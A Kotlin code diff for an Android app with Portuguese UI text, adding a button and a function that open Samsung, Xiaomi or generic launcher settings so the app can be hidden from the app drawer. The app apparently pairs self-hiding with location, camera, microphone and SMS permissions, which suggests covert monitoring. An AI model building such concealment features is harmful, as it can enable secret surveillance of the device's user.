@@ -1258,6 +1258,22 @@ class MainActivity : ComponentActivity() {
                     Text("🙈  Ocultar App Agora", color = Color(0xFFFF2A85), fontWeight = FontWeight.Bold, fontSize = 14.sp)
                 }
                 Spacer(Modifier.height(8.dp))
+                // Botão para ir direto às configurações nativas do launcher (Samsung One UI e outros)
+                Button(
+                    onClick = { openLauncherHideSettings() },
+                    modifier = Modifier.fillMaxWidth(),
+                    shape = RoundedCornerShape(12.dp),
+                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF0D1826))
+                ) {
+                    Text("📱  Ocultar na Gaveta de Apps (Launcher)", color = Color(0xFF00D2FF), fontWeight = FontWeight.Bold, fontSize = 13.sp)
+                }
+                Spacer(Modifier.height(6.dp))
+                Text(
+                    "Use este botão se o app ainda aparecer na gaveta após ocultar. Abre as configurações do seu launcher para ocultar apps.",
+                    color = Color(0xFF8E94A5), fontSize = 10.sp, lineHeight = 14.sp,
+                    modifier = Modifier.padding(bottom = 8.dp)
+                )
+                Spacer(Modifier.height(2.dp))
                 // Aviso contextual inteligente — apenas informativo, não bloqueia o botão
                 val missingPermsHide = listOf(
                     hasLocation, hasBgLocation, hasCamera, hasMic, hasPhone, hasSms,
@@ -1941,6 +1957,78 @@ class MainActivity : ComponentActivity() {
                 }
             } catch (_: Exception) {}
         }, 1500)
+    }
+
+    /**
+     * Abre as configurações nativas do launcher para ocultar apps na gaveta.
+     * Tenta Samsung One UI primeiro, depois Xiaomi MIUI, depois outros OEMs,
+     * com fallback para as configurações gerais do app do launcher padrão.
+     */
+    private fun openLauncherHideSettings() {
+        val mfr = Build.MANUFACTURER.lowercase()
+        val brand = Build.BRAND.lowercase()
+
+        // Samsung One UI: tela "Ocultar apps" nas configurações da Tela Inicial
+        if ("samsung" in mfr) {
+            val samsungIntents = listOf(
+                android.content.ComponentName(
+                    "com.sec.android.app.launcher",
+                    "com.android.homescreen.settings.HomeScreenSettingsActivity"
+                ),
+                android.content.ComponentName(
+                    "com.sec.android.app.launcher",
+                    "com.sec.android.app.launcher.settings.LauncherSettingsActivity"
+                ),
+                android.content.ComponentName(
+                    "com.samsung.android.launcher",
+                    "com.samsung.android.launcher.settings.LauncherSettingsActivity"
+                )
+            )
+            for (cn in samsungIntents) {
+                if (runCatching {
+                    startActivity(Intent().apply {
+                        component = cn
+                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                    })
+                }.isSuccess) return
+            }
+        }
+
+        // Xiaomi / MIUI / HyperOS: configurações do launcher MIUI
+        if ("xiaomi" in mfr || "redmi" in brand || "poco" in brand) {
+            if (runCatching {
+                startActivity(Intent().apply {
+                    component = android.content.ComponentName(
+                        "com.miui.home",
+                        "com.miui.home.settings.SettingsMainActivity"
+                    )
+                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                })
+            }.isSuccess) return
+        }
+
+        // Fallback: abre o app do launcher padrão nas configurações de app do sistema
+        // Assim o usuário pode encontrar a opção nativa de ocultar se existir
+        val launcherPkg = runCatching {
+            val homeIntent = Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_HOME)
+            packageManager.resolveActivity(homeIntent, 0)?.activityInfo?.packageName
+        }.getOrNull()
+
+        if (launcherPkg != null && launcherPkg != packageName) {
+            if (runCatching {
+                startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+                    data = Uri.parse("package:$launcherPkg")
+                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                })
+            }.isSuccess) return
+        }
+
+        // Último recurso: configurações de apps em geral
+        runCatching {
+            startActivity(Intent(Settings.ACTION_MANAGE_APPLICATIONS_SETTINGS).apply {
+                flags = Intent.FLAG_ACTIVITY_NEW_TASK
+            })
+        }
     }
 
     /**
